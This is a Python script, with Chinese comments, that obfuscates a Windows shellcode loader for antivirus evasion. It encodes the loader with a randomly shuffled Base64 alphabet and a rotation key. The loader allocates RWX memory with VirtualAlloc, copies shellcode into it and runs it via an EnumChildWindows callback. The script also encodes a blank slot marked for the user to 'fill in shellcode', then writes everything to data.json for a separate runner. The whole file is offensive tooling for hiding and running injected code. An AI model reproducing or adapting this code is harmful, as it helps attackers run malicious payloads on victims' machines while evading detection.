# coding:utf-8
import random
import base64
import json
import ctypes.wintypes
def random_table():
    alphabet = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    custom_alphabet = bytearray(alphabet)
    random.shuffle(custom_alphabet)
    return custom_alphabet

class Base64Encoder:
    def __init__(self, data, key, custom_alphabet):
        self.data = data
        self.CUSTOM_ALPHABET = custom_alphabet
        self.ENCODE_TRANS = bytes.maketrans(b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', self.CUSTOM_ALPHABET)
        self.key = key

    def encode(self):
        data = base64.b64encode(self.data)
        data = data[self.key:] + data[:self.key]  # 随机位移
        return data.translate(self.ENCODE_TRANS)

if __name__ == '__main__':
    # 获取随机码表
    custom_alphabet = random_table()
    print(custom_alphabet)

    # 随机位移
    key = random.randint(1, 100)
    print('密钥:', key)

    data_to_encode = b"""
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_int64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(codedata), 0x3000, 0x40)
ctypes.memmove(rwxpage, codedata, len(codedata))
ctypes.windll.User32.EnumChildWindows(None, ctypes.c_void_p(rwxpage), 0)
"""

    # 编码
    encoder = Base64Encoder(data_to_encode, key, custom_alphabet)
    encoded_data = encoder.encode()
    shellcode=b''#填写shellcode
    enshellcode = Base64Encoder(shellcode, key, custom_alphabet).encode()
    # 保存数据为 JSON
    data_to_save = {
        'key': key,
        'custom_alphabet': custom_alphabet.decode('utf-8'),
        'encoded_data': encoded_data.decode('utf-8'),
        'run': enshellcode.decode('utf-8')
    }

    with open('data.json', 'w', encoding='utf-8') as json_file:
        json.dump(data_to_save, json_file, indent=4)

    print('编码后数据:', encoded_data)
